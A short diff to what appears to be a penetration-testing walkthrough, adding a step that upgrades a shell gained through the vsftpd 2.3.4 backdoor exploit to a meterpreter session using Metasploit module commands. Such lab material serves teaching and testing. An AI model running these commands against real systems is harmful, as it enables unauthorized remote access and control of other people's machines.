@@ -15,4 +15,8 @@
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-3. Initially we'll get a command shell session
+3. Initially we'll get a command shell session, we'll update it to a `meterpreter` session.
+```
+use post/multi/manage/shell_to_meterpreter
+```
+
